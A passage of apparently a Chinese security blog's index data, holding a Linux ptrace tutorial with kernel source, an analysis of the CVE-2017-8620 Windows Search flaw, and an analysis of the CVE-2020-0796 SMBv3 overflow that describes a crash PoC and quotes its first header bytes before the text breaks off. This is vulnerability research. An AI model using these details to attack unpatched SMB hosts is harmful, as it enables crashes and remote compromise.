Linux-5.9中使用了宏的方式，在进行函数调用时先进行函数替换解析出完整的函数体再进行具体执行（详细替换可参考系列（一）中的函数定义部分内容）。而且与Linux-2.6不同的是，kernel/ptrace.c负责总体调度，使用arch_ptrace进行不同架构的处理的选择： Linux-5.9版本的这种改动相比Linux-2.6的设计，更为清晰也更为安全（个人十分喜欢这种设计，由衷佩服这些优秀的开发者）。 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:3:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"四、Request参数详解 ","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:0","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"1. 参数简述 ptrace总计有4个参数，其中比较重要的是第一个参数–request，该参数决定了具体执行的系统调用功能。可取值如下（部分）： Request Description PTRACE_TRACEME 进程被其父进程跟踪，其父进程应该希望跟踪子进程。该值仅被tracee使用，其余的request值仅被tracer使用 PTRACE_PEEKTEXT, PTRACE_PEEKDATA 从tracee的addr指定的内存地址中读取一个字节作为ptrace()调用的结果 PTRACE_PEEKUSER 从tracee的USER区域中便宜为addr处读取一个字节，该值保存了进程的寄存器和其他信息 PTRACE_POKETEXT, PTRACE_POKEDATA 向tracee的addr内存地址处复制一个字节数据 PTRACE_POKEUSER 向tracee的USER区域中偏移为addr地址处复制一个字节数据 PTRACE_GETREGS 复制tracee的通用寄存器到tracer的data处 PTRACE_GETFPREGS 复制tracee的浮点寄存器到tracer的data处 PTRACE_GETREGSET 读取tracee的寄存器 PTRACE_SETREGS 设置tracee的通用寄存器 PTRACE_SETFPREGS 设置tracee的浮点寄存器 PTRACE_CONT 重新运行stopped状态的tracee进程 PTRACE_SYSCALL 重新运行stopped状态的tracee进程，但是使tracee在系统调用的下一个entry或从系统调用退出或在执行一条指令后stop PTRACE_SINGLESTEP 设置单步执行标志 PTRACE_ATTACH 跟踪指定pid的进程 PTRACE_DETACH 结束跟踪 备注：上述参数中，PTRACE_GETREGS, PTRACE_SETREGS, PTRACE_GETFPREGS, PTRACE_SETFPREGS参数为Interl386特有。 各参数所代表的值由/usr/include/sys/ptrace.h文件指定： ","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:1","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"2. 重要参数详解 下面将对request中几个常见、重要的参数进行详细解析： 1. PTRACE_TRACEME 描述 本进程被其父进程跟踪，如果子进程没有被其父进程跟踪，不能使用该选项。PTRACE_TRACEME 只被tracee使用。 定义 /** * ptrace_traceme -- helper for PTRACE_TRACEME * * Performs checks and sets PT_PTRACED. * Should be used by all ptrace implementations for PTRACE_TRACEME. */ static int ptrace_traceme(void) { int ret = -EPERM; write_lock_irq(\u0026tasklist_lock); // 首先让writer拿到读写lock，并且会disable local irp /* Are we already being traced? */ // 是否已经处于ptrace中 if (!current-\u003eptrace) { ret = security_ptrace_traceme(current-\u003eparent); /* * Check PF_EXITING to ensure -\u003ereal_parent has not passed * exit_ptrace(). Otherwise we don't report the error but * pretend -\u003ereal_parent untraces us right after return. */ if (!ret \u0026\u0026 !(current-\u003ereal_parent-\u003eflags \u0026 PF_EXITING)) { // 检查通过，将子进程链接到父进程的ptrace链表中 current-\u003eptrace = PT_PTRACED; ptrace_link(current, current-\u003ereal_parent); } } write_unlock_irq(\u0026tasklist_lock); return ret; } 分析 通过分析源码我们可以明确看到，PTRACE_TRACEME并没有真正使子进程停止。它内部完成的操作只有对父进程是否能对子进程进行trace的合法性检查，然后将子进程链接到父进程的饿ptrace链表中。真正导致子进程停止的是exec系统调用。 在系统调用成功后，kernel会判断该进程是否被ptrace跟踪。如果处于跟踪状态，kernel将会向该进程发送SIGTRAP信号，正是该信号导致了当前进程的停止。 /** * ptrace_event - possibly stop for a ptrace event notification * @event: %PTRACE_EVENT_* value to report * @message: value for %PTRACE_GETEVENTMSG to return * * Check whether @event is enabled and, if so, report @event and @message * to the ptrace parent. * * Called without locks. */ static inline void ptrace_event(int event, unsigned long message) { if (unlikely(ptrace_event_enabled(current, event))) { current-\u003eptrace_message = message; ptrace_notify((event \u003c\u003c 8) | SIGTRAP); } else if (event == PTRACE_EVENT_EXEC) { /* legacy EXEC report via SIGTRAP */ if ((current-\u003eptrace \u0026 (PT_PTRACED|PT_SEIZED)) == PT_PTRACED) send_sig(SIGTRAP, current, 0); } } 在exec.c中对该函数的调用如下： static int exec_binprm(struct linux_binprm *bprm) { pid_t old_pid, old_vpid; int ret, depth; /* Need to fetch pid before load_binary changes it */ old_pid = current-\u003epid; rcu_read_lock(); old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current-\u003eparent)); rcu_read_unlock(); ....... audit_bprm(bprm); trace_sched_process_exec(current, old_pid, bprm); // 调用ptrace_event,传入的event为PTRACE_EVENT_EXEC // 直接走发送SIGTRAP的逻辑 ptrace_event(PTRACE_EVENT_EXEC, old_vpid); proc_exec_connector(current); return 0; } SIGTRAP信号的值为5，专门为调试设计。当kernel发生int 3时，触发回掉函数do_trap()，其代码如下： asmlinkage void do_trap(struct pt_regs *regs, unsigned long address) { force_sig_fault(SIGTRAP, TRAP_TRACE, (void __user *)address); regs-\u003epc += 4; } int force_sig_fault(int sig, int code, void __user *addr ___ARCH_SI_TRAPNO(int trapno) ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)) { return force_sig_fault_to_task(sig, code, addr ___ARCH_SI_TRAPNO(trapno) ___ARCH_SI_IA64(imm, flags, isr), current); } 父进程唤醒wait对子进程进行监控，wait有3种退出情况（子进程正常退出、收到信号退出、收到信号暂停），对于PTRACE_TRACEME来说，对应的是第三种情况–收到信号后暂停。 PTRACE_TRACEME只是表明了子进程可以被trace，如果进程调用了PTRACE_TRACEME，那么该进程处理信号的方式会发生改变。例如一个进程正在运行，此时输入ctrl+c(SIGINT),则进程会直接退出；如果进程中有ptrace (PTRACE_TRACEME,0，NULL,NULL)，当输入CTRL+C时，该进程将会处于stopped的状态。 在sys_ptrace函数中，该部分的处理流程如下： 在5.9版中，单独写成了ptrace_traceme()函数，而在2.6版本中，直接在sys_ptrace的逻辑中进行实现： 虽然2个版本的核心功能相同，但是5.9版本的处理逻辑和情况考量相比2.6版本上升了很大高度。 2. PTRACE_ATTACH 描述 attach到pid指定的进程，使其成为调用进程的tracee。tracer会向tracee发送一个SIGSTOP信号，但不一定已通过此调用完成而停止；tracer使用waitpid()等待tracee停止。 定义 static int ptrace_attach(struct task_struct *task, long request, unsigned long addr, unsigned long flags) { bool seize = (request == PTRACE_SEIZE); int retval; retval = -EIO; /* I/O error*/ /* * 判断request是PTRACE_SEIZE还是PTRACE_ATTACH。 * 如果request为PTRACE_SEIZE，则进行必要的参数检查，错误时退出。 */ if (seize) { if (addr != 0) goto out; if (flags \u0026 ~(unsigned long)PTRACE_O_MASK) goto out; flags = PT_PTRACED | PT_SEIZED | (flags \u003c\u003c PT_OPT_FLAG_SHIFT); } else { flags = PT_PTRACED; } audit_ptrace(task); /* * 判断task进程是否为kernel thread（PF_KTHREAD）， * 调用same_thread_group(task, current)，判断task是否和current进程在同一个线程组，查看current进程是否有权限trace task进程。 * 如果不符合要求，则直接退出。 */ retval = -EPERM; /*","date":"2020-10-18","objectID":"/2020/10/ptrace/:4:2","tags":["Security","Linux"],"title":"Linux ptrace 详解","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"简单分析CVE-2017-8620","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"CVE-2017-8620 Windows Search远程代码执行漏洞简单分析 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search Remote Code Execution Vulnerability 漏洞编号：CVE-2017-8620；Bugtraq ID：100034 漏洞类型：Remote Code Execution ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"3. 漏洞概述 Windows搜索处理内存中的对象时，存在远程执行代码漏洞，成功利用此漏洞的攻击者可以控制受影响的系统。虽然漏洞与SMB协议本身无关，但攻击者可SMB目标作为攻击媒介，因此该漏洞面临着与Wannacry类似的大规模利用风险。CNVD对该漏洞的技术评级为“高危”。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 10 for 32-bit Systems • Microsoft Windows 10 for x64-based Systems • Microsoft Windows 2012 R2 • Microsoft Windows 8.1 for 32-bit Systems • Microsoft Windows 8.1 for x64-based Systems • Microsoft Windows RT 8.1 • Microsoft Windows Windows 7 for 32-bit Systems Service Pack 1 • Microsoft Windows Windows 7 for x64-based Systems Service Pack 1 • Microsoft Windows Server 2008 for 32-bit Systems SP 2 (Server Core) • Microsoft Windows Server 2008 for 32-bit Systems SP2 • Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2 • Microsoft Windows Server 2008 for x64-based systems • Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 • Microsoft Windows Server 2012 R2 • Microsoft Windows Server 2012 R2 (Server Core) • Microsoft Windows Server 2016 • Microsoft Windows Server 2016 Server Core ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"5. 解决方案 获取该漏洞补丁，地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8620 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CRegXpr::CRegXpr() 漏洞对象：一个CPropertyRestriction结构，其prval具有与VT_LPWSTR的vType混淆的VT_LPWSTR以外的vType。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 跟本漏洞相关的是CPMCreateQueryIn消息， 此消息创建一个新的搜索查询，其结构如下： Offset Size (bytes) Field -------------------------------------------------------------------- 0x00 0x4 Size 0x04 0x1 CColumnSetPresent 0x05 0x3 paddingCColumnSet 0x08 var (w) ColumnSet 0x08 + w 0x1 CRestrictionPresent 0x09 + w var (x) RestrictionArray 0x09 + w + x 0x1 CSortSetPresent 0x0a + w + x 0x3 paddingCCortSet 0x0d + w + x var (y) SortSet 0x0d + w + x + y 0x1 CCategorizationSetPresent 0x0e + w + x + y 0x3 paddingCCategorizationSet 0x11 + w + x + y var (z) CCategorizationSet 0x11 + w + x + y + z 0x14 RowSetProperties 0x25 + w + x + y + z var (m) PidMapper 0x25 + w + x + y + z + m var (n) GroupArray 0x25 + w + x + y + z + m + n 0x4 Lcid 从上面的结构中可以看出，有很多字段数值大小不是固定的，这对后续的流量监测造成很大困难。 在上面的结构中，需要重点关注的字段是CRestrictionPresent和RestrictionArray。 前者标识了RestrictionArray字段是否存在（CRestrictionPresent为0时，RestrictionArray字段不能存在；CRestrictionPresent字段为非0时，RestrictionArray字段必须存在），后者包含描述查询命令树的CRestrictionArray结构。 命令树是为搜索查询指定的限制条件和排序顺序的组合。 CRestrictionArray的详细结构如下： Offset Size(bytes) Field ------------------------------------------- 0x00 0x1 count 0x01 0x1 isPresent 0x02 0x3 padding 0x05 var Restriction count字段表明Restriction字段中包含CRestriction的数量，该字段必须设置为0x01； isPresent字段标识Restriction字段是否存在是否包含CRestriction结构，值为0（省略）或1（不省略）； CRestriction指示用于命令树节点的限制类型，类型决定了在该结构的\"Restriction\"字段中找到的内容，格式如下： Offset Size(bytes) Field ------------------------------------------ 0x00 0x4 ulType 0x04 0x4 Weight 0x08 var Restriction ulType标识Restriction字段中存在的限制结构的类型。 此漏洞涉及具有指定CPropertyRestriction的ulType为RTProperty(0x5)的CRestrictions。 某些CRestriction类型可以包含嵌套的CRestrictions，形成一个限制树。因此，CPropertyRestriction可以嵌入以下任何限制条件中： RTAnd (0x1), Restriction contains a CNodeRestriction structure RTOr (0x2), Restriction contains a CNodeRestriction structure RTNot (0x3), Restriction contains a CRestriction structure RTProximity (0x6), Restriction contains a CNodeRestriction structure RTVector (0x7), Restriction contains a CVectorRestriction structure RTCoerce_Add (0xA), Restriction contains a CCoercionRestriction structure RTCoerce_Multiply (0xB), Restriction contains a CCoercionRestriction structure RTCoerce_Absolute (0xC), Restriction contains a CCoercionRestriction structure RTPhrase (0x00FFFFFD), Restriction contains a CNodeRestriction structure 上述列表中的限制具有以下结构： CNodeRestriction: Offset Size（bytes) Field ---------------------------------------------------------------- 0x00 0x4 cNode (number of structures in paNode) 0x04 var paNode (array of CRestriction structures) CVectorRestriction: Offset Size (bytes) Field ------------------------------------------------------------ 0x00 var (n) pres (CNodeRestriction structure) 0x00 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"3. 详细分析 当运行了GSS服务的server接受到CPMCreateQueryIn消息时，会解析RestrictionArray并为每个限制条件实例化相关对象。如果服务解析的是一个响应CPropertyR etriction的CRestriction，此时ulType的值为0x5，则解组prval字段并实例化CBaseStorageVariant对象。如果CPropertyRestriction的relop字段的值为0x6，表示采用的操作是正则表达式比较，则服务开始将正则表达式解析为确定性有限自动机（DFA）。 但是，在解析正则表达式之前，服务未能成功验证prval字段中的CBaseStorageVariant对象的类型是否为VT_LPWSTR。如果类型不是VT_LPWSTR，则会发生类型混淆。 远程未经身份验证的攻击者可以通过向目标服务器发送恶意CPMCreateQueryIn消息来利用这些漏洞。成功利用可能会导致在SYSTEM上下文中的目标服务器上执行远程代码。 需要注意，SMB和WSP中的所有多字节整数都以little-endian字节顺序存储 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"4. 源码分析 使用IDA反编译存在漏洞的文件： tquery.dll version 7.0.7601.23861 # CPropertyRestriction::CPropertyRestriction(long, class PDeSerStream \u0026): .text:6EC88B61 push ebx ; struct PDeSerStream * .text:6EC88B62 lea ecx, [ebp+var_20] .text:6EC88B65 call ?SetLPWSTR@CStorageVariant@@QAEXPBGI@Z ; 开始进行prval解组 .text:6EC88B6A push eax .text:6EC88B6B mov ecx, edi .text:6EC88B6D mov byte ptr [ebp+var_4], 3 .text:6EC88B71 call ??4CStorageVariant... ; CStorageVariant::operator= # Parse(const struct CRestriction *, struct CTimeLimit *): .text:6ED350B3 cmp eax, 6 ; eax contains relop, check if relop indicates regexp .text:6ED350B6 jnz short loc_6ED350DE .text:6ED350B8 push 40h ; unsigned int .text:6ED350BA call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED350BF mov [ebp+arg_0], eax .text:6ED350C2 mov ecx, [esi+14h] .text:6ED350C5 mov edx, [esi+10h] .text:6ED350C8 push ecx .text:6ED350C9 push edx .text:6ED350CA push [ebp+arg_4] .text:6ED350CD mov ecx, eax .text:6ED350CF push esi .text:6ED350D0 mov byte ptr [ebp+var_4], 7 .text:6ED350D4 call ??0CRegXpr@@QA... ; CRegXpr(), 解析正则表达式 # CRegXpr::CRegXpr(class CInternalPropertyRestriction *, class CTimeLimit \u0026, unsigned long, unsigned long): .text:6ED37ABC push 0A8h ; unsigned int .text:6ED37AC1 call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED37AC6 mov [ebp+var_7C], eax .text:6ED37AC9 push [ebp+var_78] ; int .text:6ED37ACC mov ecx, [esi+20h] .text:6ED37ACF push 0 ; int .text:6ED37AD1 push [ebp+arg_4] ; int .text:6ED37AD4 mov byte ptr [ebp+var_4], 6 .text:6ED37AD8 push ecx ; unsigned __int16 * .text:6ED37AD9 mov ecx, eax .text:6ED37ADB call ??0CDFA@@Q... ; CDFA::CDFA(), 直接进行vValue解析，并没有进行类型检查 # CNFA::CNFA(unsigned __int16 *, int, int): .text:6AF2781E mov dx, [eax] ; eax 指向 VT_LPWSTR .text:6AF27821 inc eax .text:6AF27822 inc eax .text:6AF27823 cmp dx, di .text:6AF27826 jnz short loc_6AF2781E ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"5. 攻击流量 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 根据漏洞原理，需要对SMB、WSP的诸多命令和结构进行遍历，且WSP命令中存在诸多变量字段，数值和长度无法确定，故很难在流量侧进行防御。 ","date":"2020-10-17","objectID":"/2020/10/CVE-2017-8620/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/CVE-2017-8620/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-0796","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796） ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:0:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"前言 北京时间2020.03.11日，互联网中泄漏了关于CVE-2020-0796的相关信息。在此前的微软3月份例行补丁日更新中，无意中泄漏了该漏洞的存在。该漏洞影响组件为SMBv3，在Windows 10 1903和Windows Server 1903之后的版本中存在，影响范围较广。目前尚未发现可利用EXP，但已有crash的PoC，需要积极应对。此外，该漏洞具有蠕虫传播特性，可以轻松进行蠕虫传播，需要高度重视。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:1:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"一、SMBv3组件介绍 SMB，服务器消息块，是一个网络通信协议，用于提供共享访问到文件、打印机和串行端口的节点之间的网络上。它还提供了经过身份验证的进程间通信机制。SMB的大多数用法涉及运行Microsoft Windows的计算机，在引入Active Directory之前被称为“ Microsoft Windows网络” 。相应的Windows服务是用于服务器组件的LAN Manager服务器和用于客户端组件的LAN Manager工作站。 Windows 10和Windows Server 2016引入了SMB 3.1.1 。除了在SMB3中添加的AES-128 CCM加密外，该版本还支持AES-128 GCM加密，并使用SHA-512哈希实现预认证完整性检查。当使用SMB 2.x和更高版本连接到客户端时，SMB 3.1.1还添加了必须进行的安全协商步骤。 在SMBv3中，有一项数据压缩功能，可以通过SMB进行压缩数据的传输。此次漏洞触发点就位于压缩数据的过程中。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:2:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"二、漏洞信息和描述 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"1. 漏洞文件 漏洞存在于srv2.sys文件中 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:1","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"2. 漏洞函数 该漏洞涉及到了多个函数： Srv2DecompressMessageAsync Srv2DecompressData Smb2GetHonorCompressionAlgOrder Smb2SelectCompressionAlgorithm Smb2ValidateCompressionCapabilities ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:2","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"1. 基础数据结构 这里主要看一下SMB2 COMPRESSION_TRANSFORM_HEADER结构： 首先，说明了结构使用的场景：客户端或服务器在发送压缩消息时使用SMB2 COMPRESSION_TRANSFORM_HEADER。此可选标头仅对SMB 3.1.1 dialect有效。 可以通过以下链接查看SMB 3.1.1 dialect 也就是说，在进行压缩数据传输时，底层使用的是SMB2的COMPRESSION_TRANSFORM_HEADER，但是会有SMB 3.1.1 dialect的验证特征。 然后，对以上各字段做简要说明： 字段 含义 ProtocolId (4 bytes) 协议标识符。该值必须设置为0x424D53FC，也以网络顺序表示为0xFC，“ S”，“ M”和“ B”。 OriginalCompressedSegmentSize (4 bytes) 未压缩数据段的大小（以字节为单位）。 CompressionAlgorithm (2 bytes) 此字段务必包含CompressionAlgorithms字段中指定的用于压缩SMB2消息的算法之一，“ NONE”除外。 Flags (2 bytes) 必须为2个特定值之一 Offset/Length (4 bytes) 如果在Flags字段中设置了SMB2_COMPRESSION_FLAG_CHAINED，则该字段必须解释为长度，压缩有效payload的长度（以字节为单位）；否则，该字段必须解释为偏移。 从此结构的末尾到压缩数据段开始的偏移量（以字节为单位）。 CompressionAlgorithms字段中指定的算法： Flags字段可选的固定值： 了解了以上数据结构，可以方便PoC构造和观察流量特征。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:1","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"2. 静态分析 srv2.sys文件拖入IDA，先观察函数实现： SMB首先调用srv2!Srv2ReceiveHandler函数接收数据包，并根据ProtocolId设置对应的处理函数： 如果判断数据包中为压缩的数据（ProtocolID = 0xfc4d5342），则调用处置函数–Srv2DecompressMessageAsync函数。 srv2!Srv2DecompressMessageAsync函数会继续调用 Srv2DecompressData函数： Srv2DecompressMessageAsync函数并不是实际处理压缩数据的函数，而是继续调用了Srv2DecompressData函数，跟进查看Srv2DecompressData函数： 在Srv2DecompressData函数中可以看到数据处理的部分：在进行buffer分配时，会调用 SrvNetAllocateBuffer进行分配。但是在调用时，并未对OriginalCompressedSegmentSize和Offset/Length的长度进行任何检查，对二者相加的和也未进行安全检查。此处就存在一个整数溢出，如果二者的和为一个特别大的值，会超出内存存储范围，值会变成一个很小的值。 srv2!Srv2DecompressData函数调用SmbCompressionDecompress函数，进而调用nt!RtlDecompressBufferXpressLz函数进行实际的数据解压过程。nt!RtlDecompressBufferXpressLz函数位于ntoskrnl.exe中，该函数实际进行的处理就是： 由上面的代码可以看到在进行数据解压缩时，首先进行smb compress协议数据包的解析，获取其中包含的需要解压缩的数据的大小，并和之前通过SrvNetAllocateBuffer分配的buffer的OriginalCompressedSegmentSize值进行比较，确认其大小不大于OriginalCompressedSegmentSize，然后进行内存拷贝。若v21大于OriginalCompressedSegmentSize，则返回0xC0000242错误。因为在2中进行内存分配时没有做长度检查，所以如果传入一个很大的OriginalCompressedSegmentSize值触发整数溢出，此时v21就可以设置一个极大值，但可以通过对decompress size的判断，最终调用qmemcpy拷贝一个极大的size导致缓冲区溢出。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:2","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"3. crash的PoC复现 首先是靶机只是开机，未登录的状态： 直接执行PoC，可以成功执行： 正常登录后的执行，只是正常登录，并未进行任何文件或文件夹的共享设置： 同样可以造成蓝屏： 所以，不管存在漏洞的系统是否登录、是否开启了共享，都可以正常执行PoC。联想到EXP，只要可以获取到受影响系统的IP地址，即可进行漏洞攻击。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:3","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"4. PoC代码分析 考虑到PoC尚未大范围传播，此处不放出完整代码，只对关键代码进行解释： // 设置头部 \\xfc\\x53\\x4d\\x42 // 设置OriginalCompressedSegmentSize字段，此值为多少，后续就要跟多少填充数据 \\x32\\x00\\x00\\x00 // 设置CompressionAlgorithm字段，确定使用的压缩算法 